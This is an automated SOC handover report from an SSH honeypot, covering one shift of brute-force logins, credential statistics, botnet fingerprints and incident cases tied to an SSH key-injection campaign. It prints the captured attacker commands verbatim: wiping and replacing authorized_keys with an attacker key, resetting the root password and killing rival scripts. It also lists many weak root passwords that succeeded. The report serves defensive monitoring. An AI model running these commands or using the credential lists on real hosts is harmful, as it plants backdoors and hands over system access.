# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-01 |
| **Generated At** | 2026-06-01T11:42:52Z |
| **Shift Time** | 11:42 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **1135** |
| Confirmed Threats | **1066** |
| False Positives Filtered | **69** (6.1%) |
| Unique Attacker IPs | **92** |
| Countries of Origin | **27** |
| High Severity Cases | **171** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **964** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **343** |
| Unique Credential Pairs | **145** |
| Unique Usernames | **59** |
| Unique Passwords | **129** |
| Successful Auth Pairs | **118** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 178 |
| `345gs5662d34` | 72 |
| `ubuntu` | 9 |
| `GET / HTTP/1.1` | 3 |
| `tkadmin` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 72 |
| `3245gs5662d34` | 72 |
| `123456` | 11 |
| `123` | 6 |
| `` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 72 |
| `root` | `3245gs5662d34` | 72 |
| `root` | `` | 4 |
| `tkadmin` | `tkadmin` | 3 |
| `root` | `Qwer1234!@#$` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Sachin@123` | `114.254.1.141` | 2026-06-01T04:36:56 |
| `root` | `manoj` | `114.254.1.141` | 2026-06-01T04:40:34 |
| `root` | `Demo@123` | `163.53.168.23` | 2026-06-01T05:11:30 |
| `root` | `Qwer1234!@#$` | `18.144.3.82` | 2026-06-01T05:12:16 |
| `root` | `3245gs5662d34` | `18.144.3.82` | 2026-06-01T05:12:21 |
| `root` | `Qqq123456` | `40.121.200.75` | 2026-06-01T05:19:07 |
| `root` | `3245gs5662d34` | `40.121.200.75` | 2026-06-01T05:19:12 |
| `root` | `secretpass` | `64.188.77.26` | 2026-06-01T05:21:23 |
| `root` | `Qwer1234!@#$` | `118.39.234.65` | 2026-06-01T05:21:26 |
| `root` | `3245gs5662d34` | `64.188.77.26` | 2026-06-01T05:21:27 |
| `root` | `3245gs5662d34` | `118.39.234.65` | 2026-06-01T05:21:30 |
| `root` | `Qwe123456789` | `34.78.29.97` | 2026-06-01T05:21:31 |
| `root` | `3245gs5662d34` | `34.78.29.97` | 2026-06-01T05:21:34 |
| `root` | `Qwe123456789` | `40.121.200.75` | 2026-06-01T05:22:11 |
| `root` | `1qw23er45ty6` | `64.188.77.26` | 2026-06-01T05:22:45 |
| `root` | `As@123456` | `118.39.234.65` | 2026-06-01T05:23:07 |
| `root` | `Qqq123456` | `34.78.29.97` | 2026-06-01T05:24:03 |
| `root` | `asd1234567@` | `118.39.234.65` | 2026-06-01T05:24:50 |
| `root` | `1Password` | `103.175.225.238` | 2026-06-01T05:25:10 |
| `root` | `3245gs5662d34` | `103.175.225.238` | 2026-06-01T05:25:14 |
| `root` | `secretpass` | `34.78.29.97` | 2026-06-01T05:25:21 |
| `root` | `abc123@@@` | `34.78.29.97` | 2026-06-01T05:26:38 |
| `root` | `QWEasd!@#123` | `118.39.234.65` | 2026-06-01T05:26:43 |
| `root` | `1qw23er45ty6` | `34.78.29.97` | 2026-06-01T05:27:51 |
| `root` | `toto` | `104.28.233.73` | 2026-06-01T05:27:56 |
| `root` | `Qqq123456` | `64.188.77.26` | 2026-06-01T05:28:07 |
| `root` | `toto` | `118.39.234.65` | 2026-06-01T05:28:19 |
| `root` | `1qw23er45ty6` | `40.121.200.75` | 2026-06-01T05:28:51 |
| `root` | `Admin@4321` | `64.188.77.26` | 2026-06-01T05:29:28 |
| `root` | `Asdf123@` | `118.39.234.65` | 2026-06-01T05:29:58 |
| `root` | `secretpass` | `40.121.200.75` | 2026-06-01T05:32:18 |
| `root` | `123qweASD!@` | `118.39.234.65` | 2026-06-01T05:33:22 |
| `root` | `abc123@@@` | `64.188.77.26` | 2026-06-01T05:33:41 |
| `root` | `Admin@4321` | `40.121.200.75` | 2026-06-01T05:33:53 |
| `root` | `Admin@4321` | `34.78.29.97` | 2026-06-01T05:34:29 |
| `root` | `123qweASD!@` | `104.28.233.73` | 2026-06-01T05:34:45 |
| `root` | `As@123456` | `104.28.233.73` | 2026-06-01T05:36:57 |
| `root` | `3245gs5662d34` | `104.28.233.73` | 2026-06-01T05:37:05 |
| `root` | `Qwe123456789` | `64.188.77.26` | 2026-06-01T05:37:50 |
| `root` | `abc123@@@` | `40.121.200.75` | 2026-06-01T05:38:58 |
| `root` | `Qwer1234!@#$` | `104.28.233.73` | 2026-06-01T05:43:47 |
| `root` | `asd1234567@` | `104.28.233.73` | 2026-06-01T05:48:25 |
| `root` | `123` | `172.191.151.49` | 2026-06-01T05:57:07 |
| `root` | `1234` | `172.191.151.49` | 2026-06-01T06:10:16 |
| `root` | `12345` | `172.191.151.49` | 2026-06-01T06:24:07 |
| `root` | `123@123Aa` | `116.125.120.27` | 2026-06-01T06:42:11 |
| `root` | `3245gs5662d34` | `116.125.120.27` | 2026-06-01T06:42:15 |
| `root` | `debian` | `120.48.22.91` | 2026-06-01T06:49:53 |
| `root` | `!QAZ2wsx#EDC4rfv` | `138.197.200.106` | 2026-06-01T07:03:44 |
| `root` | `3245gs5662d34` | `138.197.200.106` | 2026-06-01T07:03:50 |
| `root` | `Abcd12345` | `161.49.89.39` | 2026-06-01T07:04:07 |
| `root` | `3245gs5662d34` | `161.49.89.39` | 2026-06-01T07:04:10 |
| `root` | `aaa111` | `121.15.140.235` | 2026-06-01T07:05:26 |
| `root` | `12345678` | `172.191.151.49` | 2026-06-01T07:07:24 |
| `root` | `!Qazxsw2` | `121.15.140.235` | 2026-06-01T07:07:59 |
| `root` | `aa11223344` | `121.15.140.235` | 2026-06-01T07:10:32 |
| `root` | `A1b2c3d4` | `138.197.200.106` | 2026-06-01T07:11:56 |
| `root` | `Wh123456` | `121.15.140.235` | 2026-06-01T07:13:05 |
| `root` | `Abc12345!` | `138.197.200.106` | 2026-06-01T07:14:33 |
| `root` | `123@qwe` | `138.197.200.106` | 2026-06-01T07:17:10 |
| `root` | `123456789q` | `121.15.140.235` | 2026-06-01T07:18:07 |
| `root` | `Qwerty123` | `71.80.194.137` | 2026-06-01T07:24:54 |
| `root` | `3245gs5662d34` | `71.80.194.137` | 2026-06-01T07:25:01 |
| `root` | `Administrator` | `71.80.194.137` | 2026-06-01T07:27:05 |
| `root` | `k` | `71.80.194.137` | 2026-06-01T07:28:42 |
| `root` | `root123456` | `71.80.194.137` | 2026-06-01T07:30:18 |
| `root` | `Usman@123` | `71.80.194.137` | 2026-06-01T07:31:56 |
| `root` | `qwertyuiop123.` | `71.80.194.137` | 2026-06-01T07:33:32 |
| `root` | `Test@1234` | `71.80.194.137` | 2026-06-01T07:35:05 |
| `root` | `123abc!!!` | `71.80.194.137` | 2026-06-01T07:38:15 |
| `root` | `Sj123456` | `113.161.222.150` | 2026-06-01T07:40:20 |
| `root` | `3245gs5662d34` | `113.161.222.150` | 2026-06-01T07:40:23 |
| `root` | `root123` | `172.191.151.49` | 2026-06-01T07:47:57 |
| `root` | `root@123` | `172.191.151.49` | 2026-06-01T08:01:37 |
| `root` | `123Qwe!@#` | `92.30.242.95` | 2026-06-01T08:14:55 |
| `root` | `3245gs5662d34` | `92.30.242.95` | 2026-06-01T08:15:00 |
| `root` | `root1234` | `172.191.151.49` | 2026-06-01T08:15:16 |
| `root` | `root@1234` | `172.191.151.49` | 2026-06-01T08:29:01 |
| `root` | `adminadmin` | `172.191.151.49` | 2026-06-01T08:57:02 |
| `root` | `qwer.1234` | `102.88.137.145` | 2026-06-01T09:29:01 |
| `root` | `3245gs5662d34` | `102.88.137.145` | 2026-06-01T09:29:08 |
| `root` | `Server01` | `102.88.137.80` | 2026-06-01T09:31:40 |
| `root` | `3245gs5662d34` | `102.88.137.80` | 2026-06-01T09:31:46 |
| `root` | `1243` | `64.188.83.134` | 2026-06-01T09:37:11 |
| `root` | `3245gs5662d34` | `64.188.83.134` | 2026-06-01T09:37:15 |
| `root` | `password123@` | `187.212.47.18` | 2026-06-01T09:49:07 |
| `root` | `3245gs5662d34` | `187.212.47.18` | 2026-06-01T09:49:15 |
| `root` | `Admin@111` | `187.212.47.18` | 2026-06-01T09:51:52 |
| `root` | `QWERasdf1234` | `198.154.207.145` | 2026-06-01T09:51:53 |
| `root` | `3245gs5662d34` | `198.154.207.145` | 2026-06-01T09:51:59 |
| `root` | `Server@12` | `198.154.207.145` | 2026-06-01T09:53:36 |
| `root` | `admin1234` | `172.191.151.49` | 2026-06-01T09:53:38 |
| `root` | `qwe123456.` | `187.212.47.18` | 2026-06-01T09:54:10 |
| `root` | `Master@2026` | `198.154.207.145` | 2026-06-01T09:55:42 |
| `root` | `iflytek` | `198.154.207.145` | 2026-06-01T09:57:30 |
| `root` | `Pi@12345678` | `198.154.207.145` | 2026-06-01T09:59:10 |
| `root` | `Asd123321` | `187.212.47.18` | 2026-06-01T09:59:19 |
| `root` | `yh@123456` | `198.154.207.145` | 2026-06-01T10:00:42 |
| `root` | `Hello123` | `187.212.47.18` | 2026-06-01T10:02:33 |
| `root` | `Welcome01` | `198.154.207.145` | 2026-06-01T10:03:59 |
| `root` | `admin12345` | `172.191.151.49` | 2026-06-01T10:07:54 |
| `root` | `Admin1234` | `172.191.151.49` | 2026-06-01T10:22:03 |
| `root` | `@WSX3edc4rfv` | `114.80.32.225` | 2026-06-01T10:22:32 |
| `root` | `1a2b3c4d@` | `114.80.32.225` | 2026-06-01T10:25:25 |
| `root` | `3245gs5662d34` | `114.80.32.225` | 2026-06-01T10:25:38 |
| `root` | `Admin12345` | `172.191.151.49` | 2026-06-01T10:36:19 |
| `root` | `Abcd@12345` | `101.126.157.138` | 2026-06-01T11:00:31 |
| `root` | `3245gs5662d34` | `101.126.157.138` | 2026-06-01T11:00:35 |
| `root` | `Welkom01` | `118.193.44.184` | 2026-06-01T11:04:44 |
| `root` | `3245gs5662d34` | `118.193.44.184` | 2026-06-01T11:04:48 |
| `root` | `10203040` | `34.100.254.191` | 2026-06-01T11:07:35 |
| `root` | `3245gs5662d34` | `34.100.254.191` | 2026-06-01T11:07:37 |
| `root` | `Welkom01` | `34.100.254.191` | 2026-06-01T11:09:31 |
| `root` | `Password2025!` | `34.100.254.191` | 2026-06-01T11:11:14 |
| `root` | `golden` | `34.100.254.191` | 2026-06-01T11:13:04 |
| `root` | `Asdqwe123` | `34.100.254.191` | 2026-06-01T11:19:54 |
| `root` | `root!123` | `34.100.254.191` | 2026-06-01T11:21:47 |
| `root` | `asd1230.` | `34.100.254.191` | 2026-06-01T11:26:56 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **1135** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 369 |
| Go SSH scanner | 21 |
| OpenSSH | 5 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 256 | 22 |
| `03a80b21afa8...` | Modern SSH client | 106 | 13 |
| `16443846184e...` | Generic scanner | 16 | 2 |
| `c118de82e19e...` | Mirai/variant | 5 | 1 |
| `713bd9cc9355...` | Mirai/variant | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 256 | 22 | Mirai/variant |
| `03a80b21afa8...` | libssh | 106 | 13 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 16 | 2 | Generic scanner |
| `c118de82e19e...` | OpenSSH | 5 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 3 | 3 | — |
| `713bd9cc9355...` | libssh | 3 | 1 | Mirai/variant |
| `f1e5e9d24e5e...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 2 | 2 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 12 | 4 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1082, T1592` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 72 | 22 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:8GCCXXGiN2y7"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `121.15.140.235`, `114.80.32.225`, `114.254.1.141`, `104.28.233.73`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:2jrEVox7zdyb"|chpasswd|bash
```
Source IPs: `163.53.168.23`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `18.144.3.82`, `102.88.137.80`, `187.212.47.18`, `116.125.120.27`, `64.188.83.134`, `71.80.194.137`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **92** |
| Unique ASNs | **54** |
| High-Risk ASNs | **46** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4811` | China Telecom (Group) | 8 | HIGH |
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 5 | HIGH |
| `AS398324` | Censys, Inc. | 4 | HIGH |
| `AS14061` | DigitalOcean, LLC | 4 | HIGH |
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 4 | HIGH |
| `AS396982` | Google LLC | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (171)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a27d163f4e05

| Field | Detail |
|---|---|
| **Source IP** | `114.254.1[.]141` |
| **First Seen** | 2026-06-01 04:36 |
| **Last Seen** | 2026-06-01 04:37 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:8GCCXXGiN2y7"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 04:36:55` | `cowrie.session.connect` |
| `2026-06-01 04:36:55` | `cowrie.client.version` |
| `2026-06-01 04:36:55` | `cowrie.client.kex` |
| `2026-06-01 04:36:56` | `cowrie.login.success` |
| `2026-06-01 04:36:56` | `cowrie.session.params` |
| `2026-06-01 04:36:56` | `cowrie.command.input` |
| `2026-06-01 04:36:56` | `cowrie.command.failed` |
| `2026-06-01 04:36:56` | `cowrie.log.closed` |
| `2026-06-01 04:36:57` | `cowrie.session.params` |
| `2026-06-01 04:36:57` | `cowrie.command.input` |
| `2026-06-01 04:36:57` | `cowrie.session.file_download` |
| `2026-06-01 04:36:57` | `cowrie.log.closed` |
| `2026-06-01 04:37:09` | `cowrie.session.params` |
| `2026-06-01 04:37:09` | `cowrie.command.input` |
| `2026-06-01 04:37:09` | `cowrie.log.closed` |
| `2026-06-01 04:37:10` | `cowrie.session.params` |
| `2026-06-01 04:37:10` | `cowrie.command.input` |
| `2026-06-01 04:37:10` | `cowrie.log.closed` |
| `2026-06-01 04:37:10` | `cowrie.session.params` |
| `2026-06-01 04:37:10` | `cowrie.command.input` |
| `2026-06-01 04:37:10` | `cowrie.session.file_download` |
| `2026-06-01 04:37:10` | `cowrie.log.closed` |
| `2026-06-01 04:37:11` | `cowrie.session.params` |
| `2026-06-01 04:37:11` | `cowrie.command.input` |
| `2026-06-01 04:37:11` | `cowrie.log.closed` |
| `2026-06-01 04:37:11` | `cowrie.session.params` |
| `2026-06-01 04:37:11` | `cowrie.command.input` |
| `2026-06-01 04:37:11` | `cowrie.log.closed` |
| `2026-06-01 04:37:12` | `cowrie.session.params` |
| `2026-06-01 04:37:12` | `cowrie.command.input` |
| `2026-06-01 04:37:12` | `cowrie.command.input` |
| `2026-06-01 04:37:12` | `cowrie.log.closed` |
| `2026-06-01 04:37:12` | `cowrie.session.params` |
| `2026-06-01 04:37:12` | `cowrie.command.input` |
| `2026-06-01 04:37:12` | `cowrie.log.closed` |
| `2026-06-01 04:37:13` | `cowrie.session.params` |
| `2026-06-01 04:37:13` | `cowrie.command.input` |
| `2026-06-01 04:37:13` | `cowrie.log.closed` |
| `2026-06-01 04:37:13` | `cowrie.session.params` |
| `2026-06-01 04:37:13` | `cowrie.command.input` |
| `2026-06-01 04:37:13` | `cowrie.log.closed` |
| `2026-06-01 04:37:14` | `cowrie.session.params` |
| `2026-06-01 04:37:14` | `cowrie.command.input` |
| `2026-06-01 04:37:14` | `cowrie.log.closed` |
| `2026-06-01 04:37:14` | `cowrie.session.params` |
| `2026-06-01 04:37:14` | `cowrie.command.input` |
| `2026-06-01 04:37:15` | `cowrie.log.closed` |
| `2026-06-01 04:37:15` | `cowrie.session.params` |
| `2026-06-01 04:37:15` | `cowrie.command.input` |
| `2026-06-01 04:37:15` | `cowrie.log.closed` |
| `2026-06-01 04:37:15` | `cowrie.session.params` |
| `2026-06-01 04:37:15` | `cowrie.command.input` |
| `2026-06-01 04:37:16` | `cowrie.log.closed` |
| `2026-06-01 04:37:16` | `cowrie.session.params` |
| `2026-06-01 04:37:16` | `cowrie.command.input` |
| `2026-06-01 04:37:16` | `cowrie.log.closed` |
| `2026-06-01 04:37:16` | `cowrie.session.params` |
| `2026-06-01 04:37:16` | `cowrie.command.input` |
| `2026-06-01 04:37:17` | `cowrie.log.closed` |
| `2026-06-01 04:37:17` | `cowrie.session.params` |
| `2026-06-01 04:37:17` | `cowrie.command.input` |
| `2026-06-01 04:37:17` | `cowrie.log.closed` |
| `2026-06-01 04:37:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.254.1[.]141` to AbuseIPDB if not already reported
- [ ] Block `114.254.1[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79974da002ce

| Field | Detail |
|---|---|
| **Source IP** | `114.254.1[.]141` |
| **First Seen** | 2026-06-01 04:40 |
| **Last Seen** | 2026-06-01 04:40 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:gTIFlN49InJS"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 04:40:34` | `cowrie.session.connect` |
| `2026-06-01 04:40:34` | `cowrie.client.version` |
| `2026-06-01 04:40:34` | `cowrie.client.kex` |
| `2026-06-01 04:40:34` | `cowrie.login.success` |
| `2026-06-01 04:40:35` | `cowrie.session.params` |
| `2026-06-01 04:40:35` | `cowrie.command.input` |
| `2026-06-01 04:40:35` | `cowrie.command.failed` |
| `2026-06-01 04:40:35` | `cowrie.log.closed` |
| `2026-06-01 04:40:35` | `cowrie.session.params` |
| `2026-06-01 04:40:35` | `cowrie.command.input` |
| `2026-06-01 04:40:35` | `cowrie.session.file_download` |
| `2026-06-01 04:40:35` | `cowrie.log.closed` |
| `2026-06-01 04:40:48` | `cowrie.session.params` |
| `2026-06-01 04:40:48` | `cowrie.command.input` |
| `2026-06-01 04:40:48` | `cowrie.log.closed` |
| `2026-06-01 04:40:48` | `cowrie.session.params` |
| `2026-06-01 04:40:48` | `cowrie.command.input` |
| `2026-06-01 04:40:48` | `cowrie.log.closed` |
| `2026-06-01 04:40:49` | `cowrie.session.params` |
| `2026-06-01 04:40:49` | `cowrie.command.input` |
| `2026-06-01 04:40:49` | `cowrie.session.file_download` |
| `2026-06-01 04:40:49` | `cowrie.log.closed` |
| `2026-06-01 04:40:49` | `cowrie.session.params` |
| `2026-06-01 04:40:49` | `cowrie.command.input` |
| `2026-06-01 04:40:50` | `cowrie.log.closed` |
| `2026-06-01 04:40:50` | `cowrie.session.params` |
| `2026-06-01 04:40:50` | `cowrie.command.input` |
| `2026-06-01 04:40:50` | `cowrie.log.closed` |
| `2026-06-01 04:40:50` | `cowrie.session.params` |
| `2026-06-01 04:40:50` | `cowrie.command.input` |
| `2026-06-01 04:40:50` | `cowrie.command.input` |
| `2026-06-01 04:40:51` | `cowrie.log.closed` |
| `2026-06-01 04:40:51` | `cowrie.session.params` |
| `2026-06-01 04:40:51` | `cowrie.command.input` |
| `2026-06-01 04:40:51` | `cowrie.log.closed` |
| `2026-06-01 04:40:52` | `cowrie.session.params` |
| `2026-06-01 04:40:52` | `cowrie.command.input` |
| `2026-06-01 04:40:52` | `cowrie.log.closed` |
| `2026-06-01 04:40:52` | `cowrie.session.params` |
| `2026-06-01 04:40:52` | `cowrie.command.input` |
| `2026-06-01 04:40:52` | `cowrie.log.closed` |
| `2026-06-01 04:40:53` | `cowrie.session.params` |
| `2026-06-01 04:40:53` | `cowrie.command.input` |
| `2026-06-01 04:40:53` | `cowrie.log.closed` |
| `2026-06-01 04:40:53` | `cowrie.session.params` |
| `2026-06-01 04:40:53` | `cowrie.command.input` |
| `2026-06-01 04:40:53` | `cowrie.log.closed` |
| `2026-06-01 04:40:54` | `cowrie.session.params` |
| `2026-06-01 04:40:54` | `cowrie.command.input` |
| `2026-06-01 04:40:54` | `cowrie.log.closed` |
| `2026-06-01 04:40:54` | `cowrie.session.params` |
| `2026-06-01 04:40:54` | `cowrie.command.input` |
| `2026-06-01 04:40:54` | `cowrie.log.closed` |
| `2026-06-01 04:40:55` | `cowrie.session.params` |
| `2026-06-01 04:40:55` | `cowrie.command.input` |
| `2026-06-01 04:40:55` | `cowrie.log.closed` |
| `2026-06-01 04:40:55` | `cowrie.session.params` |
| `2026-06-01 04:40:55` | `cowrie.command.input` |
| `2026-06-01 04:40:56` | `cowrie.log.closed` |
| `2026-06-01 04:40:56` | `cowrie.session.params` |
| `2026-06-01 04:40:56` | `cowrie.command.input` |
| `2026-06-01 04:40:56` | `cowrie.log.closed` |
| `2026-06-01 04:40:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.254.1[.]141` to AbuseIPDB if not already reported
- [ ] Block `114.254.1[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c466538a4fb2

| Field | Detail |
|---|---|
| **Source IP** | `163.53.168[.]23` |
